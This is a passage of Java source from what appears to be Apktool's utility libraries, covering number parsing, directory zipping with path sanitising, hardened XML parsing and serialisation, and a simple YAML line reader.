                }
                value |= 0xFF000000;
                break;
            case 9: // #AARRGGBB
                for (; i < end; i++) {
                    int hex = parseHex(text.charAt(i));
                    if (hex == -1) {
                        throw new NumberFormatException();
                    }
                    value = (value << 4) | hex;
                }
                break;
            default:
                throw new NumberFormatException();
        }

        return value;
    }

    public static int parseInt(CharSequence text) throws NumberFormatException {
        return parseInt(text, 0, text.length());
    }

    public static int parseInt(CharSequence text, int start, int end) throws NumberFormatException {
        if (start > end || end > text.length()) {
            throw new IndexOutOfBoundsException();
        }
        if (start == end) {
            throw new NumberFormatException();
        }

        int i = start;
        boolean negative = text.charAt(i) == '-';
        if ((negative || text.charAt(i) == '+') && ++i == end) {
            throw new NumberFormatException();
        }

        if (i + 1 < end && text.charAt(i) == '0' && (text.charAt(i + 1) == 'x' || text.charAt(i + 1) == 'X')) {
            if (negative || (i += 2) == end) {
                throw new NumberFormatException();
            }
            return parseIntHex(text, i, end);
        }

        return parseIntDec(text, i, end, negative);
    }

    private static int parseIntDec(CharSequence text, int start, int end, boolean negative)
            throws NumberFormatException {
        long value = 0;

        for (int i = start; i < end; i++) {
            char ch = text.charAt(i);
            if (ch < '0' || ch > '9') {
                throw new NumberFormatException();
            }

            value = value * 10 + (ch - '0');

            if (negative ? -value < Integer.MIN_VALUE : value > Integer.MAX_VALUE) {
                throw new NumberFormatException();
            }
        }

        return (int) (negative ? -value : value);
    }

    private static int parseIntHex(CharSequence text, int start, int end) throws NumberFormatException {
        long value = 0;

        for (int i = start; i < end; i++) {
            int hex = parseHex(text.charAt(i));
            if (hex == -1) {
                throw new NumberFormatException();
            }

            value = (value << 4) + hex;

            if (value > 0xFFFFFFFFL) {
                throw new NumberFormatException();
            }
        }

        return (int) value;
    }

    public static float parseFloat(CharSequence text) throws NumberFormatException {
        return parseFloat(text, 0, text.length());
    }

    public static float parseFloat(CharSequence text, int start, int end) throws NumberFormatException {
        if (start > end || end > text.length()) {
            throw new IndexOutOfBoundsException();
        }
        if (start == end) {
            throw new NumberFormatException();
        }

        int i = 0;
        boolean negative = text.charAt(i) == '-';
        if ((negative || text.charAt(i) == '+') && ++i == end) {
            throw new NumberFormatException();
        }

        if (i + 1 < end && text.charAt(i) == '0' && (text.charAt(i + 1) == 'x' || text.charAt(i + 1) == 'X')) {
            if ((i += 2) == end) {
                throw new NumberFormatException();
            }
            return parseFloatHex(text, i, end, negative);
        }

        return parseFloatDec(text, i, end, negative);
    }

    private static float parseFloatDec(CharSequence text, int start, int end, boolean negative)
            throws NumberFormatException {
        int i = start;
        int significandBegin = i;
        boolean significandStart = false;
        boolean validSignificand = false;
        boolean subInteger = false;
        int mostSignificantExponent = 0;

        while (i < end && text.charAt(i) != 'e' && text.charAt(i) != 'E') {
            if (text.charAt(i) == '.') {
                if (subInteger) {
                    throw new NumberFormatException();
                }

                subInteger = true;
                i++;
                continue;
            }

            if (significandStart && !subInteger) {
                ++mostSignificantExponent;
            } else if (!significandStart && subInteger) {
                --mostSignificantExponent;
            }

            if (text.charAt(i) < '0' || text.charAt(i) > '9') {
                throw new NumberFormatException();
            }

            validSignificand = true;
            if (text.charAt(i) != '0' && !significandStart) {
                significandStart = true;
                significandBegin = i;
            }

            i++;
        }
        if (!validSignificand) {
            throw new NumberFormatException();
        }

        int significandEnd = i;
        int declaredExponent = 0;
        if (i < end) {
            if (i == end - 1) {
                throw new NumberFormatException();
            }

            i++;
            boolean negativeExponent = text.charAt(i) == '-';
            if (negativeExponent || text.charAt(i) == '+') {
                i++;
            }

            while (i < end) {
                if (text.charAt(i) < '0' || text.charAt(i) > '9') {
                    throw new NumberFormatException();
                }

                int currentValue = text.charAt(i) - '0';
                declaredExponent = declaredExponent * 10 + currentValue;
                i++;
            }
            if (negativeExponent) {
                declaredExponent = -declaredExponent;
            }
        }

        if (!significandStart) {
            return negative ? -0.0f : 0.0f;
        }

        mostSignificantExponent += declaredExponent;
        i = significandBegin;

        long significandValue = getValueByExponent(mostSignificantExponent);
        if (significandValue == 0L) {
            throw new NumberFormatException();
        }

        int baseBinaryShift = getShiftByExponent(mostSignificantExponent);
        significandValue *= text.charAt(i) - '0';
        int significandScalarShift = getScalarShiftByValue(significandValue);
        significandValue >>>= significandScalarShift;
        baseBinaryShift += significandScalarShift;

        int currentExponent = mostSignificantExponent - 1;
        i++;
        while (i < significandEnd) {
            if (text.charAt(i) < '1' || text.charAt(i) > '9') {
                if (text.charAt(i) == '0') {
                    --currentExponent;
                }

                i++;
                continue;
            }

            long scalarValue = text.charAt(i) - '0';
            long currentValue = getValueByExponent(currentExponent) * scalarValue;
            int relativeDownShift = baseBinaryShift - getShiftByExponent(currentExponent);
            int scalarShift = getScalarShiftByValue(currentValue);
            currentValue = currentValue >>> scalarShift;
            relativeDownShift -= scalarShift;
            if (relativeDownShift > 59) {
                break;
            }

            significandValue += currentValue >>> relativeDownShift;
            if ((significandValue & SCALAR_SHIFT_1) != 0L) {
                significandValue = significandValue >>> 1;
                baseBinaryShift += 1;
            }

            --currentExponent;
            i++;
        }

        significandValue += ROUND_VALUE;
        if ((significandValue & SCALAR_SHIFT_1) != 0L) {
            significandValue = significandValue >>> 1;
            baseBinaryShift += 1;
        }

        if (baseBinaryShift < SINGLE_PRECISION_EXP_MIN || baseBinaryShift > SINGLE_PRECISION_EXP_MAX) {
            throw new NumberFormatException();
        }

        int mantissa = (int) ((significandValue & ~DEC_SIGNIFICAND_LEADING_BIT) >>> DEC_SIGNIFICAND_DOWN_SHIFT);
        int biasedExp = baseBinaryShift + SINGLE_PRECISION_BIAS;
        return Float.intBitsToFloat((negative ? FLOAT_NEGATIVE_MASK : 0) | mantissa | (biasedExp << 23));
    }

    private static float parseFloatHex(CharSequence text, int start, int end, boolean negative)
            throws NumberFormatException {
        int i = start;
        int currentMantissa = 0;
        int currentSkew = 0;
        int mantissaBits = 0;
        boolean mantissaStart = false;
        boolean subInteger = false;
        boolean validMantissa = false;

        while (i < end && text.charAt(i) != 'p') {
            int indexValue = parseHex(text.charAt(i));
            if (indexValue == -1) {
                if (text.charAt(i) != '.' || subInteger) {
                    throw new NumberFormatException();
                }

                subInteger = true;
                i++;
                continue;
            }

            validMantissa = true;
            if (!mantissaStart && indexValue != 0) {
                mantissaStart = true;
                currentMantissa = indexValue;

                if (indexValue >= 8) {
                    currentSkew -= 1;
                    mantissaBits = 3;
                } else if (indexValue >= 4) {
                    currentSkew -= 2;
                    mantissaBits = 2;
                } else if (indexValue >= 2) {
                    currentSkew -= 3;
                    mantissaBits = 1;
                } else {
                    currentSkew -= 4;
                    mantissaBits = 0;
                }
            } else if (mantissaStart && mantissaBits < 24) {
                currentMantissa = (currentMantissa << 4) + indexValue;
                mantissaBits += 4;
            }

            if (mantissaStart && !subInteger) {
                currentSkew += 4;
            } else if (!mantissaStart && subInteger) {
                currentSkew -= 4;
            }

            i++;
        }

        if (!validMantissa) {
            throw new NumberFormatException();
        }

        int declaredExponent = 0;
        if (i < end) {
            if (i == end - 1) {
                throw new NumberFormatException();
            }
            i++;

            boolean negativeExponent = text.charAt(i) == '-';
            if (negativeExponent || text.charAt(i) == '+') {
                i++;
            }

            while (i < end) {
                if (text.charAt(i) < '0' || text.charAt(i) > '9') {
                    throw new NumberFormatException();
                }

                int currentValue = text.charAt(i) - '0';
                declaredExponent = declaredExponent * 10 + currentValue;
                i++;
            }

            if (negativeExponent) {
                declaredExponent = -declaredExponent;
            }
        }

        if (24 - mantissaBits < 0) {
            currentMantissa >>>= (mantissaBits - 24);
        } else {
            currentMantissa <<= (24 - mantissaBits);
        }
        currentMantissa = currentMantissa & MANTISSA_EXPONENT_ADJUST_VALUE;

        int exponent;
        if (currentMantissa == MANTISSA_EXPONENT_ADJUST_VALUE || (currentMantissa == DENORMAL_EXPONENT_ADJUST_VALUE
                && declaredExponent + currentSkew + 1 == SINGLE_PRECISION_EXP_MIN)) {
            currentMantissa = 0;
            exponent = declaredExponent + currentSkew + 1;
        } else {
            currentMantissa = (currentMantissa + 1) >>> 1;
            exponent = declaredExponent + currentSkew;
        }

        if (!mantissaStart) {
            return negative ? -0.0f : 0.0f;
        }

        if (exponent < SINGLE_PRECISION_EXP_MIN || exponent > SINGLE_PRECISION_EXP_MAX) {
            throw new NumberFormatException();
        }

        int biasedExp = exponent + SINGLE_PRECISION_BIAS;
        return Float.intBitsToFloat((negative ? FLOAT_NEGATIVE_MASK : 0) | currentMantissa | (biasedExp << 23));
    }

    private static long getValueByExponent(int exponent) {
        if (exponent < POSITIVE_SIGNIFICANDS.length) {
            if (exponent >= 0) {
                return POSITIVE_SIGNIFICANDS[exponent];
            }
            if (exponent >= -NEGATIVE_SIGNIFICANDS.length) {
                return NEGATIVE_SIGNIFICANDS[-exponent - 1];
            }
        }
        return 0L;
    }

    private static int getShiftByExponent(int exponent) {
        if (exponent < POSITIVE_SIGNIFICANDS.length) {
            if (exponent >= 0) {
                return POSITIVE_SHIFTS[exponent];
            }
            if (exponent >= -NEGATIVE_SIGNIFICANDS.length) {
                return NEGATIVE_SHIFTS[-exponent - 1];
            }
        }
        return 0;
    }

    private static int getScalarShiftByValue(long valueToNormalize) {
        if ((valueToNormalize & SCALAR_SHIFT_4) != 0L) {
            return 4;
        }
        if ((valueToNormalize & SCALAR_SHIFT_3) != 0L) {
            return 3;
        }
        if ((valueToNormalize & SCALAR_SHIFT_2) != 0L) {
            return 2;
        }
        if ((valueToNormalize & SCALAR_SHIFT_1) != 0L) {
            return 1;
        }
        return 0;
    }
}

```

`brut.j.util/src/main/java/brut/util/ZipUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.Log;
import org.apache.commons.io.FilenameUtils;
import org.apache.commons.io.IOUtils;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.InvalidPathException;
import java.util.Collection;
import java.util.function.Predicate;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class ZipUtils {
    private static final String TAG = "";

    private ZipUtils() {
        // Private constructor for utility class.
    }

    public static void zipDir(File dir, ZipOutputStream out, Collection<String> doNotCompress) throws IOException {
        zipDir(dir, null, out, doNotCompress);
    }

    public static void zipDir(File baseDir, String dirName, ZipOutputStream out, Collection<String> doNotCompress)
            throws IOException {
        File dir;
        if (dirName != null && !dirName.isEmpty()) {
            dir = new File(baseDir, dirName);
        } else {
            dir = baseDir;
        }
        if (!dir.isDirectory()) {
            return;
        }

        for (File file : dir.listFiles()) {
            String fileName = baseDir.toPath().relativize(file.toPath()).toString();

            if (file.isDirectory()) {
                zipDir(baseDir, fileName, out, doNotCompress);
            } else if (file.isFile()) {
                zipFile(baseDir, fileName, out, (doNotCompress != null && !doNotCompress.isEmpty())
                    ? entryName -> doNotCompress.contains(entryName)
                                || doNotCompress.contains(FilenameUtils.getExtension(entryName))
                    : entryName -> false);
            }
        }
    }

    public static void zipFile(File baseDir, String fileName, ZipOutputStream out, boolean doNotCompress)
            throws IOException {
        zipFile(baseDir, fileName, out, entryName -> doNotCompress);
    }

    private static void zipFile(File baseDir, String fileName, ZipOutputStream out, Predicate<String> doNotCompress)
            throws IOException {
        try {
            fileName = BrutIO.sanitizePath(baseDir, fileName);
            if (fileName.isEmpty()) {
                return;
            }

            File file = new File(baseDir, fileName);
            if (!file.isFile()) {
                return;
            }

            String entryName = FilenameUtils.separatorsToUnix(fileName);
            ZipEntry zipEntry = new ZipEntry(entryName);

            if (doNotCompress.test(entryName)) {
                zipEntry.setMethod(ZipEntry.STORED);
                zipEntry.setSize(file.length());
                try (InputStream in = Files.newInputStream(file.toPath())) {
                    CRC32 crc = BrutIO.calculateCrc(in);
                    zipEntry.setCrc(crc.getValue());
                }
            } else {
                zipEntry.setMethod(ZipEntry.DEFLATED);
            }

            out.putNextEntry(zipEntry);
            try (InputStream in = Files.newInputStream(file.toPath())) {
                IOUtils.copy(in, out);
            }
            out.closeEntry();
        } catch (InvalidPathException ex) {
            Log.w(TAG, "Skipping file %s (%s)", fileName, ex.getMessage());
        }
    }
}

```

`brut.j.xml/build.gradle.kts`:

```kts
dependencies {
    implementation(project(":brut.j.common"))
    api(libs.xmlpull)
}

```

`brut.j.xml/src/main/java/brut/xml/XmlUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.xml;

import brut.common.Log;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.XMLConstants;
import javax.xml.namespace.NamespaceContext;
import javax.xml.namespace.QName;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Collections;
import java.util.Iterator;

public final class XmlUtils {
    private static final String TAG = "";

    public static final String XML_PROLOG = "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
    public static final String XML_PREFIX = "xml";
    public static final String XML_URI = "http://www.w3.org/XML/1998/namespace";
    public static final String XMLNS_PREFIX = "xmlns";
    public static final String XMLNS_URI = "http://www.w3.org/2000/xmlns/";

    private static final String FEATURE_DISALLOW_DOCTYPE_DECL =
        "http://apache.org/xml/features/disallow-doctype-decl";
    private static final String FEATURE_LOAD_EXTERNAL_DTD =
        "http://apache.org/xml/features/nonvalidating/load-external-dtd";

    private XmlUtils() {
        // Private constructor for utility class.
    }

    private static DocumentBuilder newDocumentBuilder(boolean nsAware)
            throws SAXException, ParserConfigurationException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(nsAware);
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setFeature(FEATURE_DISALLOW_DOCTYPE_DECL, true);
        factory.setFeature(FEATURE_LOAD_EXTERNAL_DTD, false);

        try {
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        } catch (IllegalArgumentException ignored) {
            Log.w(TAG, "JAXP 1.5 Support is required to validate XML");
        }

        return factory.newDocumentBuilder();
    }

    public static Document newDocument() throws SAXException, ParserConfigurationException {
        return newDocument(false);
    }

    public static Document newDocument(boolean nsAware) throws SAXException, ParserConfigurationException {
        return newDocumentBuilder(nsAware).newDocument();
    }

    public static Document parseDocument(String xml) throws IOException, SAXException, ParserConfigurationException {
        return parseDocument(xml, false);
    }

    public static Document parseDocument(String xml, boolean nsAware)
            throws IOException, SAXException, ParserConfigurationException {
        DocumentBuilder builder = newDocumentBuilder(nsAware);
        StringReader reader = new StringReader(xml);
        return builder.parse(new InputSource(reader));
    }

    public static Document loadDocument(File file) throws IOException, SAXException, ParserConfigurationException {
        return loadDocument(file, false);
    }

    public static Document loadDocument(File file, boolean nsAware)
            throws IOException, SAXException, ParserConfigurationException {
        DocumentBuilder builder = newDocumentBuilder(nsAware);
        // Not using the parse(File) method on purpose, so that we can control when to close it.
        // Somehow parse(File) does not seem to close the file in all cases.
        try (InputStream in = Files.newInputStream(file.toPath())) {
            return builder.parse(new InputSource(in));
        }
    }

    public static void saveDocument(Document doc, File file)
            throws IOException, SAXException, ParserConfigurationException, TransformerException {
        TransformerFactory factory = TransformerFactory.newInstance();
        Transformer transformer = factory.newTransformer();
        transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");

        byte[] xmlDecl = XML_PROLOG.getBytes(StandardCharsets.US_ASCII);
        byte[] newLine = System.lineSeparator().getBytes(StandardCharsets.US_ASCII);

        try (OutputStream out = Files.newOutputStream(file.toPath())) {
            out.write(xmlDecl);
            out.write(newLine);
            transformer.transform(new DOMSource(doc), new StreamResult(out));
            out.write(newLine);
        }
    }

    @SuppressWarnings("unchecked")
    public static <T> T evaluateXPath(Document doc, String expression, Class<T> returnType)
            throws XPathExpressionException {
        QName type;
        if (returnType == Node.class) {
            type = XPathConstants.NODE;
        } else if (returnType == NodeList.class) {
            type = XPathConstants.NODESET;
        } else if (returnType == String.class) {
            type = XPathConstants.STRING;
        } else if (returnType == Double.class) {
            type = XPathConstants.NUMBER;
        } else if (returnType == Boolean.class) {
            type = XPathConstants.BOOLEAN;
        } else {
            throw new IllegalArgumentException("Unexpected return type: " + returnType.getName());
        }

        XPath xPath = XPathFactory.newInstance().newXPath();
        xPath.setNamespaceContext(new NamespaceContext() {
            @Override
            public String getNamespaceURI(String prefix) {
                return doc.lookupNamespaceURI(prefix);
            }

            @Override
            public String getPrefix(String namespaceURI) {
                return doc.lookupPrefix(namespaceURI);
            }

            @Override
            public Iterator<String> getPrefixes(String namespaceURI) {
                String prefix = getPrefix(namespaceURI);
                return prefix != null ? Collections.singleton(prefix).iterator() : Collections.emptyIterator();
            }
        });

        return (T) xPath.evaluate(expression, doc, type);
    }
}

```

`brut.j.xml/src/main/java/brut/xmlpull/XmlPullUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.xmlpull;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public final class XmlPullUtils {
    private static final String PROPERTY_XMLDECL_STANDALONE
            = "http://xmlpull.org/v1/doc/properties.html#xmldecl-standalone";

    public interface EventHandler {
        boolean onEvent(XmlPullParser in, XmlSerializer out) throws XmlPullParserException;
    }

    private XmlPullUtils() {
        // Private constructor for utility class.
    }

    public static void copy(XmlPullParser in, XmlSerializer out) throws XmlPullParserException, IOException {
        copy(in, out, null);
    }

    public static void copy(XmlPullParser in, XmlSerializer out, EventHandler handler)
            throws XmlPullParserException, IOException {
        Boolean standalone = (Boolean) in.getProperty(PROPERTY_XMLDECL_STANDALONE);

        // Some parsers may have already consumed the event that starts the document, so we manually emit that
        // event here for consistency.
        if (in.getEventType() == XmlPullParser.START_DOCUMENT) {
            out.startDocument(in.getInputEncoding(), standalone);
        }

        for (;;) {
            int event = in.nextToken();
            if (event == -1) {
                break;
            }
            if (event == XmlPullParser.END_DOCUMENT) {
                out.endDocument();
                break;
            }
            if (event == XmlPullParser.START_DOCUMENT) {
                out.startDocument(in.getInputEncoding(), standalone);
                continue;
            }
            if (handler != null && handler.onEvent(in, out)) {
                continue;
            }
            switch (event) {
                case XmlPullParser.START_TAG:
                    if (!in.getFeature(XmlPullParser.FEATURE_REPORT_NAMESPACE_ATTRIBUTES)) {
                        int nsStart = in.getNamespaceCount(in.getDepth() - 1);
                        int nsEnd = in.getNamespaceCount(in.getDepth());
                        for (int i = nsStart; i < nsEnd; i++) {
                            String prefix = in.getNamespacePrefix(i);
                            String ns = in.getNamespaceUri(i);
                            out.setPrefix(prefix, ns);
                        }
                    }
                    out.startTag(normalizeNamespace(in.getNamespace()), in.getName());
                    for (int i = 0; i < in.getAttributeCount(); i++) {
                        String ns = normalizeNamespace(in.getAttributeNamespace(i));
                        String name = in.getAttributeName(i);
                        String value = in.getAttributeValue(i);
                        out.attribute(ns, name, value);
                    }
                    break;
                case XmlPullParser.END_TAG:
                    out.endTag(normalizeNamespace(in.getNamespace()), in.getName());
                    break;
                case XmlPullParser.TEXT:
                    out.text(in.getText());
                    break;
                case XmlPullParser.CDSECT:
                    out.cdsect(in.getText());
                    break;
                case XmlPullParser.ENTITY_REF:
                    out.entityRef(in.getName());
                    break;
                case XmlPullParser.IGNORABLE_WHITESPACE:
                    out.ignorableWhitespace(in.getText());
                    break;
                case XmlPullParser.PROCESSING_INSTRUCTION:
                    out.processingInstruction(in.getText());
                    break;
                case XmlPullParser.COMMENT:
                    out.comment(in.getText());
                    break;
                case XmlPullParser.DOCDECL:
                    out.docdecl(in.getText());
                    break;
                default:
                    throw new IllegalStateException("Unknown event: " + event);
            }
        }
    }

    /**
     * Some parsers may return an empty string when a namespace in unsupported, which can confuse serializers.
     * This method normalizes empty strings to be null.
     */
    private static String normalizeNamespace(String namespace) {
        return (namespace != null && !namespace.isEmpty()) ? namespace : null;
    }
}

```

`brut.j.yaml/build.gradle.kts`:

```kts
dependencies {
    implementation(libs.commons.text)
}

```

`brut.j.yaml/src/main/java/brut/yaml/YamlLine.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.yaml;

import java.util.Objects;

public class YamlLine {
    public int indent = 0;
    private String key = "";
    private String value = "";
    public boolean isComment;
    public boolean isEmpty;
    public boolean hasColon;
    public boolean isNull;
    public boolean isItem;

    public YamlLine(String line) {
        // special end line marker
        isNull = Objects.isNull(line);
        if (isNull) {
            return;
        }
        isEmpty = line.trim().isEmpty();
        if (isEmpty) {
            return;
        }
        // count indent - space only
        int len = line.length();
        for (int i = 0; i < len; i++) {
            if (line.charAt(i) == ' ') {
                indent++;
            } else {
                break;
            }
        }
        // remove whitespace
        line = line.trim();
        char first = line.charAt(0);

        isComment = first == '#' || first == '!';
        isItem = first == '-';
        if (isComment) {
            // for comment fill value
            value = line.substring(1).trim();
        } else {
            // value line
            hasColon = line.indexOf(':') != -1;
            if (isItem) {
                // array item line has only the value
                value = line.substring(1).trim();
            } else {
                // split line to key - value
                String[] parts = line.split(":");
                if (parts.length > 0) {
                    key = parts[0].trim();
                    if (parts.length > 1) {
                        value = parts[1].trim();
                    }
                }
            }
        }
    }

    public static String unescape(String value) {
        return YamlStringEscapeUtils.unescapeString(value);
    }

    public String getKey() {
        String res = unescape(key);
        // remove quotation marks
        res = res.replaceAll("^\"|\"$", "");
        res = res.replaceAll("^'|'$", "");
        return res;
    }

    public String getValue() {
        if (value.equals("null")) {
            return null;
        }
        String res = unescape(value);
        // remove quotation marks
        res = res.replaceAll("^\"|\"$", "");
        res = res.replaceAll("^'|'$", "");
        return res;
    }

    public int getValueInt() {
        return Integer.parseInt(value);
    }

    public boolean getValueBool() {
        return Objects.equals(value, "true");
    }
}

```

`brut.j.yaml/src/main/java/brut/yaml/YamlReader.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.yaml;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class YamlReader {
    private List<YamlLine> mLines;
    private int mCurrent;

    public YamlReader(InputStream in) {
        mLines = new ArrayList<>();
        mLines.add(new YamlLine(null));
        read(in);
    }

    public void pushLine() {
        if (mCurrent > 0) {
            mCurrent--;
        }
    }

    public void read(InputStream in) {
        Scanner scanner = new Scanner(in);
        mLines = new ArrayList<>();
        while (scanner.hasNextLine()) {
            mLines.add(new YamlLine(scanner.nextLine()));
        }
        mLines.add(new YamlLine(null));
    }

    public YamlLine getLine() {
        return mLines.get(mCurrent);
    }

    public int getIndent() {
        return getLine().indent;
    }

    public boolean isEnd() {
        return getLine().isNull;
    }

    public boolean isCommentOrEmpty() {
        YamlLine line = getLine();
        return line.isEmpty || line.isComment;
    }

    public void skipInsignificant() {
        if (isEnd()) {
            return;
        }
        while (isCommentOrEmpty()) {
            mCurrent++;
            if (isEnd()) {
                break;
            }
        }
    }

    public boolean nextLine() {
        if (isEnd()) {
            return false;
        }
        for (;;) {
            mCurrent++;
            if (isCommentOrEmpty()) {
                continue;
            }
            return !isEnd();
        }
    }

    protected interface Checker {
        boolean check(YamlLine line);
    }

    protected interface Updater<T> {
        void update(T items, YamlReader reader);
    }

    /**
    * Read root object from start to end
    */
    public <T extends YamlSerializable> void readRoot(T obj) {
        if (isEnd()) {
            return;
        }
        int objIndent = 0;
        skipInsignificant();
        for (;;) {
            if (isEnd()) {
                return;
            }
            YamlLine line = getLine();
            // skip don't checked line or lines with other indent
            if (objIndent != line.indent || !line.hasColon) {
                nextLine();
                continue;
            }
            obj.readItem(this);
            nextLine();
        }
    }

    /**
     * Read object. Reader stand on the object name.
     * The object data should be placed on the next line
     * and have indent.
     */
    protected <T> void readObject(T obj, Checker check, Updater<T> updater) {
        if (isEnd()) {
            return;
        }
        int prevIndent = getIndent();
        // detect indent for the object data
        nextLine();
        YamlLine line = getLine();
        int objIndent = line.indent;
        // object data must have indent
        // otherwise stop reading
        if (objIndent <= prevIndent || !check.check(line)) {
            pushLine();
            return;
        }
        updater.update(obj, this);
        while (nextLine()) {
            if (isEnd()) {
                return;
            }
            line = getLine();
            if (objIndent != line.indent || !check.check(line)) {
                pushLine();
                return;
            }
            updater.update(obj, this);
        }
    }

    public <T extends YamlSerializable> void readObject(T obj) {
        readObject(obj, line -> line.hasColon, YamlSerializable::readItem);
    }

    /**
     * Read list. Reader stand on the object name.
     * The list data should be placed on the next line.
     * Data should have same indent. May by same with name.
     */
    protected <T> void readList(List<T> list, Updater<List<T>> updater) {
        if (isEnd()) {
            return;
        }
        int listIndent = getIndent();
        nextLine();
        int dataIndent = getIndent();
        for (;;) {
            if (isEnd()) {
                return;
            }
            // check incorrect data indent
            if (dataIndent < listIndent) {
                pushLine();
                return;
            }
            YamlLine line = getLine();
            if (dataIndent != line.indent || !line.isItem) {
                pushLine();
                return;
            }
            updater.update(list, this);
            nextLine();
        }
    }

    public void readStringList(List<String> list) {
        readList(list, (items, reader) -> items.add(reader.getLine().getValue()));
    }

    public void readIntList(List<Integer> list) {
        readList(list, (items, reader) -> items.add(reader.getLine().getValueInt()));
    }

    public void readStringMap(Map<String, String> map) {
        readObject(map, line -> line.hasColon,
            (items, reader) -> {
                YamlLine line = reader.getLine();
                items.put(line.getKey(), line.getValue());
            });
    }

    public void readIntMap(Map<String, Integer> map) {
        readObject(map, line -> line.hasColon,
            (items, reader) -> {
                YamlLine line = reader.getLine();
                items.put(line.getKey(), line.getValueInt());
            });
    }

    public void readBoolMap(Map<String, Boolean> map) {
        readObject(map, line -> line.hasColon,
            (items, reader) -> {
                YamlLine line = reader.getLine();
                items.put(line.getKey(), line.getValueBool());
            });
    }
}

```

`brut.j.yaml/src/main/java/brut/yaml/YamlSerializable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.yaml;

public interface YamlSerializable {
    void readItem(YamlReader reader);

    void write(YamlWriter writer);
}

```
